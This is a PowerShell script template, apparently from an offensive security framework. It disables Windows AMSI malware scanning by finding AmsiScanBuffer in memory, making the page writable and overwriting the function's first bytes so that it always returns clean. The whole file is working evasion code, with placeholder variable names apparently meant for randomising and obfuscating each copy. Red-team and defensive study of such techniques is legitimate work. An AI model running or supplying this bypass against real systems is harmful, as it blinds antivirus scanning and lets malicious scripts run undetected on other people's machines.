# AMSI bypass via inline patching
#
# This code will bypass AMSI by patching the assembly instructions of amsi!AmsiScanBuffer. This technique has been
# refined to:
#     1. Find the address of amsi!AmsiScanBuffer in memory without invoking kernel32!GetProcAddress with an obviously
#        malicious string.
#     2. Utilize VirtualQuery to ensure the scanning does not go past the boundary of the page, ensuring it can be run
#        multiple times without crashing.
#
# Original Author: Paul Laîné (@am0nsec)
# Modified By:
#   Shantanu Khandelwal (@shantanukhande)
#   Spencer McIntyre (@zeroSteiner)
# See:
#     * https://www.contextis.com/en/blog/amsi-bypass
#     * https://gist.github.com/shantanu561993/6483e524dc225a188de04465c8512909
#     * https://www.redteam.cafe/red-team/powershell/using-reflection-for-amsi-bypass

Class %{cls_Hunter} {
    static [IntPtr] %{mth_FindAddress}([IntPtr]$%{var_address}, [byte[]]$%{var_egg}) {
        $%{var_meminfo} = New-Object byte[](48);
        $%{var_VirtualQueryAddr} = %{func_get_proc_address} kernel32.dll VirtualQuery;
        $%{var_VirtualQueryDelegate} = %{func_get_delegate_type} @([IntPtr], [Byte[]], [Int]) ([Int]);
        $%{var_VirtualQuery} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($%{var_VirtualQueryAddr}, $%{var_VirtualQueryDelegate});

        $%{var_VirtualQuery}.Invoke($%{var_address}, $%{var_meminfo}, $%{var_meminfo}.Length);

        If ([IntPtr]::Size -eq 8) {
            $%{var_address_cursor} = $%{var_address}.ToInt64();
            $%{var_address_end} = [BitConverter]::ToInt64($%{var_meminfo}, 0) + [BitConverter]::ToInt64($%{var_meminfo}, 24);
        }
        Else {
            $%{var_address_cursor} = $%{var_address}.ToInt32();
            $%{var_address_end} = [BitConverter]::ToInt32($%{var_meminfo}, 0) + [BitConverter]::ToInt32($%{var_meminfo}, 16);
        }

        while ($%{var_address_cursor} -lt $%{var_address_end}) {
            [int]$%{var_count} = 0;

            while ($%{var_address_cursor} -lt $%{var_address_end}) {
                $%{var_address_cursor} += 1;
                If ([System.Runtime.InteropServices.Marshal]::ReadByte([IntPtr]::New($%{var_address_cursor})) -eq $%{var_egg}.Get($%{var_count})) {
                    $%{var_count}++;
                    If ($%{var_count} -eq $%{var_egg}.Length) {
                        return $%{var_address_cursor} - $%{var_egg}.Length - 1;
                    }
                }
                Else {
                    break;
                }
            }
        }
        return [IntPtr]::Zero;
    }
}


function %{func_get_proc_address} {
    Param ($%{var_module}, $%{var_procedure});
    $%{var_unsafe_native_methods} = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods');

    return $%{var_unsafe_native_methods}.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($%{var_unsafe_native_methods}.GetMethod('GetModuleHandle')).Invoke($null, @($%{var_module})))), $%{var_procedure}));
}


function %{func_get_delegate_type} {
    Param (
        [Parameter(Position = 0, Mandatory = $True)] [Type[]] $%{var_parameters},
        [Parameter(Position = 1)] [Type] $%{var_return_type} = [Void]
    );

    $%{var_type_builder} = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate]);
    $%{var_type_builder}.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $%{var_parameters}).SetImplementationFlags('Runtime, Managed');
    $%{var_type_builder}.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $%{var_return_type}, $%{var_parameters}).SetImplementationFlags('Runtime, Managed');

    return $%{var_type_builder}.CreateType();
}


$%{var_LoadLibraryAddr} = %{func_get_proc_address} kernel32.dll LoadLibraryA;
$%{var_LoadLibraryDelegate} = %{func_get_delegate_type} @([String]) ([IntPtr]);
$%{var_LoadLibrary} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($%{var_LoadLibraryAddr}, $%{var_LoadLibraryDelegate});
$%{var_GetProcAddressAddr} = %{func_get_proc_address} kernel32.dll GetProcAddress;
$%{var_GetProcAddressDelegate} = %{func_get_delegate_type} @([IntPtr], [String]) ([IntPtr]);
$%{var_GetProcAddress} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($%{var_GetProcAddressAddr}, $%{var_GetProcAddressDelegate});
$%{var_VirtualProtectAddr} = %{func_get_proc_address} kernel32.dll VirtualProtect;
$%{var_VirtualProtectDelegate} = %{func_get_delegate_type} @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool]);
$%{var_VirtualProtect} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($%{var_VirtualProtectAddr}, $%{var_VirtualProtectDelegate});


If ([IntPtr]::Size -eq 8) {
    # Write-Host "[+] 64-bits process";
    [byte[]]$%{var_egg} = [byte[]] (
        # mov     r11,rsp
        0x4C, 0x8B, 0xDC,
        # mov     qword ptr [r11+8],rbx
        0x49, 0x89, 0x5B, 0x08,
        # mov     qword ptr [r11+10h],rbp
        0x49, 0x89, 0x6B, 0x10,
        # mov     qword ptr [r11+18h],rsi
        0x49, 0x89, 0x73, 0x18,
        # push    rdi
        0x57,
        # push    r14
        0x41, 0x56,
        # push    r15
        0x41, 0x57,
        # sub     rsp,70h
        0x48, 0x83, 0xEC, 0x70
    );
} Else {
    # Write-Host "[+] 32-bits process";
    [byte[]]$%{var_egg} = [byte[]] (
        # mov     edi,edi
        0x8B, 0xFF,
        # push    ebp
        0x55,
        # mov     ebp,esp
        0x8B, 0xEC,
        # sub     esp,18h
        0x83, 0xEC, 0x18,
        # push    ebx
        0x53,
        # push    esi
        0x56
    );
}


$%{var_hModule} = $%{var_LoadLibrary}.Invoke("amsi.dll");
# Write-Host "[+] AMSI DLL Handle: $%{var_hModule}";
$%{var_DllGetClassObjectAddress} = $%{var_GetProcAddress}.Invoke($%{var_hModule}, "DllGetClassObject");
# Write-Host "[+] DllGetClassObject address: $%{var_DllGetClassObjectAddress}";
[IntPtr]$%{var_targetedAddress} = [%{cls_Hunter}]::%{mth_FindAddress}($%{var_DllGetClassObjectAddress}, $%{var_egg});

If ($%{var_targetedAddress} -ne [IntPtr]::Zero) {
    # Write-Host "[+] Targeted address: $%{var_targetedAddress}";
    $%{var_oldProtectionBuffer1} = 0;
    $%{var_VirtualProtect}.Invoke($%{var_targetedAddress}, [uint32]2, 4, [ref]$%{var_oldProtectionBuffer1}) | Out-Null;

    $patch = [byte[]] (
        # xor rax, rax
        0x31, 0xC0,
        # ret
        0xC3
    );
    [System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $%{var_targetedAddress}, 3);

    $%{var_oldProtectionBuffer2} = 0;
    $%{var_VirtualProtect}.Invoke($%{var_targetedAddress}, [uint32]2, $%{var_oldProtectionBuffer1}, [ref]$%{var_oldProtectionBuffer2}) | Out-Null;
}
